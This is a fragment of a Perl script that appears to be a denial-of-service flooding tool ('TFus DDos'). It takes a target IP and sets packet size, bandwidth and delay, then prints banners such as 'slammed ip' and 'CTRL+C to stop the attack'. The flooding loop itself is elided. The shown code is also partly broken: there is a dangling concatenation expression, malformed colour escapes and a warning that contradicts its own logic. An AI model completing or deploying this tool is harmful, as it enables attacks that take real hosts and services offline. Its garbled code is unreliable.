...
if ($help || !$ip) {
  print <<'EOL';
 The usage of command is perl tfus.pl 1.1.1.1
EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: The package size is too big --the command will be ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}
...
printf "[0;32m>>   𝕋𝔽𝕦𝕤 𝔻𝔻𝕠𝕤...  \n";
printf "[0;32m>> 
                                    \n";
printf "[0;31m>> slammed ip    \n";
printf "[0;36m>> slammed port     \n";
($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
printf "[1;31m>> CTRL+C to stop the attack  \n" unless $time;
